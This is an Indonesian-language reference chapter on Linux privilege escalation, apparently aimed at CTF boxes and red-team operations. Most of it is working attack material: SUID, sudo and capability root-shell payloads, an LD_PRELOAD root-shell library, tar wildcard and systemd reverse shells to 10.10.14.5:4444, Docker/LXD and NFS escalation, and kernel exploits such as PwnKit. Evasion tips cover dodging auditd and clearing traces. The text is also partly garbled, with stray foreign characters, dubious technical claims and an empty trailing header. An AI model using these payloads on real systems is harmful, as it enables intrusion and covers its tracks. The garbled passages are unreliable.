# privesc-linux — linux

# Bab 5: Linux Privilege Escalation — Referensi Teknis

## 5.1 SUID/SGID Abuse

**Konsep:** Binary dengan bit SUID dieksekusi dengan eUID pemilik file (biasanya root). SGID sama tapi untuk group.

### Pencarian

```bash
find / -perm -4000 -type f 2>/dev/null        # SUID
find / -perm -2000 -type f 2>/dev/null        # SGID
find / -perm -6000 -type f 2>/dev/null        # keduanya
find / -perm -4000 -exec ls -la {} \; 2>/dev/null
```

### Shortcut GTFOBins (yang paling sering muncul di box)

| Binary | Payload | Kondisi |
|---|---|---|
| `find` (SUID) | `find . -exec /bin/sh -p \;` atau `find / -user root -perm -4000 -exec /bin/sh -p \;` | `find` harus SUID |
| `vim` (SUID) | `vim -c ':!sh -p'` atau `:set shell=/bin/sh` | interactive |
| `env` / `awk` / `sed` | `awk 'BEGIN {system("/bin/sh -p")}'` | `-p` penting agar shell tidak drop eUID |
| `bash` (SUID) | `bash -p` | harus dikompilasi tanpa `-DISABLE_SUID` pada kernel modern sudah dihalangi |
| `cp` (SUID) | copy /etc/passwd, append user hash root | copy dari writable dir |
| `less` | `!/bin/sh` saat paging file root |
| `python` SUID | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `pkexec` (SUID) | CVE-2021-4034 → lihat 5.9 |

**Kenapa `-p`:** shell modern (bash/dash) drop eUID ke rUID real user kecuali diberi flag privileged. Tanpa `-p`, eUID=root tapi rUID=user → prompt `whoami` tetap user. Interpretasi `id` vs `id -u`: keduanya beda konteks, selalu cek `id` (euid vs uid muncul di real/effective).

**SGID spesifik:** musik `SGID` pada `ssh-agent` → attach socket + inject key. Atau SGID group menarik: cek `getent group | grep -i <gid binary>`.

### Ceg base64 backdooring SUID file baru
Linux mount option `nosuid` di `/tmp`, `/home` (umum di distro modern) → SUID copy Anda diam-diam tidak dieksekusi sebagai root. Cek:
```bash
mount | grep -E "noexec|nosuid"
findmnt -no OPTIONS /tmp
```

### SUID custom binary (bukan GTFOBins)
```bash
strings /usr/local/bin/suid_helper | grep -Ei "system|exec|popen|/bin"
strace /usr/local/bin/suid_helper 2>&1 | grep -Ei "execve|clone"
```
Kalau dia panggil binary tanpa full path (mis. `system("menu")`) → PATH hijack (5.5).

---

## 5.2 Capabilities

**Konsep:** fine-grained privileges tanpa full SUID. Cukup satu capability bisa jadi privesc.

```bash
getcap -r / 2>/dev/null
# atau cepat
find / -xdev -type f -exec getcap {} \; 2>/dev/null
```

| Cap set | Payload |
|---|---|
| `cap_setuid=ep` pada `python3` | `python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'` |
| `cap_dac_read_search=ep` pada `tar` | `tar cf backup.tar /etc/shadow` → ambil hash root |
| `cap_net_raw=ep` | sniffer credential, ARP spoof di shared L2 |
| `cap_net_bind_service` | bind port 80/443 (bukan langsung root, tapi pivot untuk service misbelief) |
| `cap_sys_ptrace=ep` | inject shellcode ke proses root yang berjalan (`gdb -p`, atau CFFI) |
| `cap_sys_admin` pada binary apa pun | hampir setara root: mount, `unshare`, docker socket |

**Point penting:**
- Capabilities pada *interpreter* (python, perl, node) = game over instan.
- `=ep` artinya effective+permitted. `=p` saja tidak cukup (harus raise dulu via `capset`, tidak berguna kalau binary tidak aware).
- Pada kernel ≥ 5.8, file caps di interupsi oleh ambient caps — jangan berharap cap muncul di subshell.

---

## 5.3 Sudo Misconfiguration

### Enumerasi
```bash
sudo -l
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/
```

### NOPASSWD
```
luser ALL=(ALL) NOPASSWD: /usr/bin/vim
```
→ Cek GTFOBins kolom sudo. Contoh:
- `sudo less /etc/shadow`
- `sudo env /bin/sh`
- `sudo apache2 -f /etc/passwd` trigger
- `sudo find /dev/null -exec /bin/sh \;` (find + sudo ops)
- `sudo awk 'BEGIN{system("/bin/sh")}'`

### sudoedit (CVE-2021-3156 + sudoedit env)
- **CVE-2021-3156 Baron Samedit**: heap overflow di argumen `sudoedit -s '\'` backslash parsing. Dapat di versi **sudo 1.8.2–1.9.5p1** (patch di 1.9.5p2, Jan 2021).
```bash
sudoedit -s '\' $(python3 -c 'print("A"*65536)')
# kalau respons = "malloc(): invalid size" → vulnerable
```
- **sudoedit hijack EDITOR**: kalau `/etc/sudoers` mengizinkan `luser ALL=(root) sudoedit /etc/file`, tetapi sudo versi lama membaca shell env lebih agresif:
```
export EDITOR="vi --cmd 'set shell=/bin/sh'"
sudo -l  # konfirmasi sudoedit
echo 'user ALL=(root) NOPASSWD: SETENV:' ; export SUDO_EDITOR=...
```
- **sudo < 1.9.8 adalah kunci**: ENV override termasuk `SUDO_EDITOR`.

### LD_PRELOAD
Jika `sudo -l` menunjukkan `env_keep+=LD_PRELOAD` — adalah izin runtime loading. Tapi sebenarnya **kebanyakan modern sudo punya LD_PRELOAD yang dihapus** kecuali explicitly enabled.

**Payload** (compile di target):
```c
// preload.c
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/sh -p");
}
```
```bash
gcc -shared -fPIC -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/any-allowed-bin
```

**Kenapa gagal**: sudoاجر default men-strip LD_PRELOAD kapan root di-spawn. Tidak ada `env_keep` berisi LD_PRELOAD → JANGAN buang waktu compile payload.

Kalau hanya `env_keep+=LD_LIBRARY_PATH` → compile shared lib dengan simbol yang dipakai binary target:
```bash
ldd /usr/sbin/allowed-binary    # cari lib custom, mis. /opt/lib/libapp.so
# buat libapp.so overwrite, drop ke $LD_LIBRARY_PATH
```

### env_keep lain
- `env_keep+=PYTHONPATH` → timpa `site.py`/modul internal python.
- `env_keep+=PATH` → PATH hijack via sudo (lihat 5.5).

---

## 5.4 Cron & Systemd Timer Writable

### Enumerasi
```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /var/spool/cron/crontabs/
systemctl list-timers --all
find /etc/systemd -name "*.timer" -o -name "*.service" | xargs ls -la

# binary yang dijalankan root — writable?
grep -E "Exec|Run" /etc/crontab /etc/cron.d/* 2>/dev/null
```

### Vektor: script cron writable oleh user
```
/etc/crontab: * * * * * root /usr/local/bin/backup.sh
```
```bash
ls -la /usr/local/bin/backup.sh     # -rwxrwxrwx? 
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> backup.sh
# tunggu ≤60 detik, lalu /tmp/rootbash -p
```

### Wildcard injection (cron tar)
```
*/5 * * * * root tar czf /backup.tgz /home/user/*.txt
```
```bash
# di /home/user
echo '' > --checkpoint=1
echo '' > --checkpoint-action=exec=sh /home/user/rev.sh
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > rev.sh
chmod +x rev.sh
```
**Kenapa berhasil**: tar mem-parse filename sebagai argumen.
**Kenapa gagal**: cron job dengan quoted paths, atau cron abspath `cd` dulu.

### systemd timers
Path unit: `/etc/systemd/system/*timer`, check `OnCalendar=`. Timer service file `/etc/systemd/system/foo.service` writable:
```
[Service]
Type=oneshot
ExecStart=/bin/sh -c '/bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```
```bash
systemctl daemon-reload  # if sudo available, else wait for timer
```

**Cek library dependency suid:** custom daemon service dengan executable di `/opt` sering punya `LD_LIBRARY_PATH` atau wrapper mencari `.env` — grep `systemctl cat <svc>` untuk `ExecStart=` pointing to `/opt`.

---

## 5.5 PATH Hijack

**Kondisi:** script yang di-running dengan privilege (cron/SUID) memanggil binary tanpa absolute path:

```bash
strings /usr/local/bin/check.sh
# output: "ping", "curl", "ls"
```

**Payload:**
```bash
cd /tmp
echo 'cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' > curl
chmod +x curl
export PATH=/tmp:$PATH (untuk subshell yang mewarisi PATH)
# atau dengan writable /, sisipkan binary langsung
```

**kenapa gagal:** modern cron SUID binary reset `PATH` ke `secure_path` (akun root: `/usr/sbin:/usr/bin:...`). Script python exec juga — tetap `sudo -l` umumnya dikunci `secure_path`. PATH hijack pada task SUID **tergantung apakah binary set PATH sendiri**.

SUID binary menggunakan syscall `setuid(0)` explicit sebelum `system()` → PATH hijack works only jika env NOT sanitized. Strace-nya:

```bash
strace -f /usr/local/bin/suid_bin 2>&1 | grep execve
# output: execve("/bin/sh", ["sh", "-c", "curl http://..."], ... 
```
→ `sh -c "curl ..."` = win.

### PATH env_keep via sudo
```
sudo -l
Matching Defaults entries: env_reset, secure_path="/usr/bin:..."
```
Tidak ada secure_path → suid/default bisnis lain:
```bash
sudo PATH=/tmp:/usr/bin:/bin <allowed-binary>
```

---

## 5.6 NFS no_root_squash

**Check dari box target:**
```bash
cat /etc/exports | grep -i "no_root_squash\|rw"
# output: /share *(rw,no_root_squash)
```
- `no_root_squash` = UID 0 client mapped ke UID 0 server.

**Dari attacker box (Linux):**
```bash
mkdir /tmp/nfs
mount -t nfs 10.10.10.x:/share /tmp/nfs
cp /bin/bash /tmp/nfs/bash
chmod 4755 /tmp/nfs/bash
```
**Di target:**
```bash
/tmp/share/bash -p    # euid=0
```

**Kenapa gagal:** NFSv4 with Kerberos/`sec=krb5p`, server mengaktifkan `root_squash` default modern distro, client mount pada Windows tidak set SUID by default (`mount -o suid` perlu). NFSv4 umumnya masih transfer — jangan masalah.

**Alternatif (squashed):** `no_all_squash` + ambil UID user lain yang punya file di share (`showmount -e`, lalu manual chown dengan spoofed UID client-side root).

---

## 5.7 Docker / LXD Group

### Docker
```bash
id | grep -E "docker|lxd"
docker ps 2>&1
```
Anggota group `docker` = root de facto.
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# atau binary-less:
docker run -v /:/host -d alpine sleep 300
docker exec -it <id> chroot /host sh
```
**Dind (docker-in-docker) tidak hadir** → fallback: `docker socket di /var/run/docker.sock` writable:
```bash
curl --unix-socket /var/run/docker.sock -X POST ...
```
Atau image yang host volume: `docker run -v /:/host --privileged`.

**Docker tanpa daemon image:** sym-link `/etc/passwd` di volume shared.

### LXD/LXC
```bash
lxd init --auto 2>&1   # kalau group lxd member
# di attacker box: build lxc image
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine   # output: alpine-image.tar.gz
lxc image import ./alpine*.tar.gz --alias privesc
lxc init privesc privesc -c security.privileged=true
lxc config device add privesc mydev disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```
Di container → host FS di `/mnt/root`. Set `/etc/passwd` atau copy ssh key.

**Versi:** Ubuntu 14.04/latest, LXD pre-5.0 deploy script deprecated sejak **LXD 5.0 LTS (2022)** — script build tetap berfungsi di kebanyakan box CTF.

---

## 5.8 Kernel CVE — Konkret dan Kondisi

| CVE | Nama | Kernel | Payload | Tanda Success |
|---|---|---|---|---|
| **CVE-2022-0847** | Dirty Pipe | 5.8 – 5.16.11, 5.15.25, 5.10.102 | C PoC (Max Kellermann) menimpa file read-only termasuk `/etc/passwd` | `uname -r` in-range, /etc/passwd writable tanpa write access |
| **CVE-2021-4034** | PwnKit (polkit pkexec) |几乎所有 distro dengan polkit < 0.120-4 (2022-01) | `git clone https://github.com/ly4k/PwnKit` compile & run; atau `bash PwnKit.sh` | euid=0 root. Tidak kompatibel kalau pkexec SUID dihapus |
| **CVE-2023-32233** | nf_tables anonymous sets | 5.1 – 6.3.1 (2023-05) | exploit PoC yang perlu `CAP_NET_ADMIN` (namespace), user namespaces enabled (`unshare` → ok) | `cat /proc/sys/user/max_user_namespaces` ≠ 0 |
| **CVE-2016-5195** | Dirty COW | 2.6.22–4.8.3, agak modern dengan backport | PoC `dirty` / `cowroot` | `uname -r` old box (masih muncul di embedded) |
| **CVE-2021-3156** | Baron Samedit | sudo 1.8.2–1.9.5p1 | heap-based; PoC `sudo-exploit` | "sudoedit -s '\\' ack malloc" |
| **CVE-2022-2588** | route4_change UAF | 5.x range tertentu | route4 exploit di legacy box |
| **CVE-2024-1086** | nft UAF (double-free) | 5.14–6.6 | `unshare` namespace ok → compile exploit | high reliability (~90%+), exploit dump files via overwritten modprobe path |

### Dirty Pipe PoC (pola)
```c
// target: overwrite /etc/passwd (root:root:0:0::/root:/bin/bash → known hash)
// teknik: splice() pipe buffer → memodify flags → offset write
```
Hanya bisa append/overwrite tapi tidak truncate: overwriting `/etc/passwd` line harus ukuran sama atau footer-nya sendiri.

**Kernel header requirement**: exploit perlu compile on-target (atau statis). `gcc` present? Kalau tidak, tftp/base64 static binary (UPX), atau `/dev/shm`.

### Decision tree
```
uname -a → hasil referensi versi → searchsploit linux kernel <ver>
searchsploit --exclude "(Dos/Poc)" linux kernel C
# check compile available di target:
which gcc cc g++
# kalau tidak ada, build di attacker box glibc match (match ldd --version glibc target)
```

### user namespace check (critical untuk nf_tables/modprobe exploit)
```bash
unshare -Urn whoami  # output: root di namespace? atau EPERM?
cat /proc/sys/kernel/unprivileged_userns_clone / proc/sys/user/max_user_namespaces
```

---

## 5.9 Enumerasi Tools

### linpeas
```bash
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# atau upload base64:
base64 -d /tmp/lin.b64 > /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
/etc//tmp/linpeas.sh -a -o /tmp/out.txt
```
**Output poin merah (RED) prioritas**:
- `/etc/passwd` dengan credential inline
- writable `/etc/sudoers*`
- cron jobs, wildcard, SUID/SGID
- credential di process/environment/config
- NFS exports, docker group

**Bisa narik forensic bila targeted**: `linpeas -a` (aggressive, lebih lama).

### pspy (cron sniper)
```bash
./pspy64
./pspy32 -pf -i 1000      # watch file system events & intervals
```
- Tanpa root, tanpa strace requirement: pakai `inotify` + `/proc` polling → mengungkap commandline cron/systemd run as root.
- **What to look for**: `[cmd]` lines with `root` prefix setiap N detik → copy commandline, cek path relative → PATH hijack.
- `-f` = file event, `-pc` filter process commands.

Larger output section:
```
2024-01-01 03:00:01 UTC CMD (root) UID=0 PID=1337     | /usr/bin/env bash /opt/scripts/backup.sh
```
→ cek write di `/opt/scripts/backup.sh`, subshell `bash` = PATH hijack dalam reach.

### Manual quick-check checklist (tanpa tools)
```bash
id; sudo -l; uname -r; cat /proc/version
find / -writable -type f 2>/dev/null | grep -vE "^/proc|^/sys|/tmp"
getcap -r / 2>/dev/null
ls -la /etc/cron* /var/spool/cron 2>/dev/null
grep -iE "timeout|idle" /etc/ssh/sshd_config; cat /etc/exports
ls -la /var/run/docker.sock; docker -H unix:///proc/1/root/var/run/docker.sock ps
cat ~/.ssh/*; grep -ri "pass" /home --include="*config*" -l
journalctl --no-pager | grep -iE "sudo|cron" | tail -50   # if in systemd-journal group
```

### Delivery roti basi
```bash
# transfer
curl 10.10.14.5:8000/linpeas.sh -o /tmp/l.sh    # kalau egress open
base64 linpeas.sh > /tmp/x; echo "..." | base64 -d > /tmp/l.sh  # via copy-paste
```

---

## 5.10 Jebakan Operasional (Read This sebelum Gagal)

1. **`os-release` misleading**: "Ubuntu 20.04" patch bisa sudah backport kernel CVE fix. SELALU `uname -r` exact + `dpkg -l | grep sudo` exact version sebelum compile kernel exploit.
2. **gcc tidak ada di target**, dan exploit compile static di attacker box dengan glibc mismatch → `GLIBC_2.34 not found` saat run. Solusi: compile dengan `-static` penuh INCLUDE, lalu strip, atau match `ldd --version` di target.
3. **`unshare -Urn` disabled** (thank systemd, especially containers/Alpine `singularity` profiles, hardened grseculirty) → nf_tables/CVE-2024-1086 out of question, jangan buang waktu.
4. **Modern mount flag `nosuid`di `/tmp`, `/home`, dan overlay dalam Docker** → SUID copy does nothing, shell masih `id user`. Check `findmnt -no OPTIONS <path>` sebelum kirim `/tmp/bash -p`.
5. **`timeout` dari cron kills payload sebelum siap** (beberapa persen murah cron dengan `timeout 10`): gunakan payload instan, jangan compile runtime.
6. **Cron waktu tidak sampai**: check `date; ls -la /etc/localtime; cat /etc/timezone` — kalau box jam wrong/jumped, timer dengan `OnCalendar=00:00` takkan fire sesuai ekspektasi Anda.
7. **pspy run desde /tmp deleted**: pspy sendiri muncul di logе auditd (execve audit) jika OS punya audit rules → gunakan `/dev/shm` dengan hafal path, hapus setelahnya.
8. **linpeas false positive**: "SUID binary: /usr/bin/mount" → sistem normal. Jangan penuhi report dengan GCC normal entries. Fokus di SUID **bukan default** (list di `/usr/share/doc` baseline distro).
9. **Docker group tapi daemon down/unreachable socket permission di-v**: `docker ps` = `Cannot connect ... permission denied` berarti socket di-recover group tapi socket dir pair owner di 0700 root. Alt: `cgroup v1 release_agent` (Older kernel <5.x box, cgroups v1 mounted) atau `docker -H` ke unix socket dengan `su - root` opportunity. Check `ls -la /run/docker.sock` exact mode.
10. **CVE-2021-4034 PwnKit in patched-box audit**: pkexec dieksploitasi → daemons polkit teleme flag. Untuk op-red, lakukan kembali drop bash id static binary, atau GCI cleanup `rm /tmp/. gconv`.
11. **NFS `no_root_squash` seen but NFSv4+AUTH_SYS disabled** at server (`sec=sys` hanya): mount from Windows/non-Linux client gak akan find support. Use Linux attacker box only.
12. **shell automation tooth**: banyak box CTf/ prod-user disables `bash` history, so `echo $PATH tampered` trace hilang. Silence footprint: semua stage script in `/dev/shm` (tmpfs, not persisted to disk image).

### Rule-of-thumb priority vertical (bila pilihan banyak)
1. docker/lxd group (fastest, most reliable)
2. sudo NOPASSWD GTFOBins
3. writable cron script / PATH hijack dengan privilege host
4. capabilities interpreter
5. NFS exports
6. sudo env exploitation (LD_PRELOAD)
7. Kernel CVE (paling reliable direct tapi paling resiko CrashBox)

Kernel exploit = pilihan terakhir karena **panic box = kerusakan operasional** (kernel oops, connection massive latency, kena detected di auditd sih system).

### Cleanup
```bash
# reset SUID planted
rm /tmp/rootbash /tmp/.suid_b
# revert modified cron
echo 'original' > /usr/local/bin/backup.sh  # tip: backup original content FIRST read before modify
# audit trail minimalize
>/var/log/... tidak bisa: asumsikan semua logged; tool usage base64 in, delete artifact di /dev/shm only.
```

**Poin utama**: sebelum Anda menimpa file legion (`/etc/passwd`, cron script, sudoers backup), **selalu baca original content & restore di memori/anotasi** — recovery yang gagal = detection & box unusable untuk client.

---

## [reasoning trace]


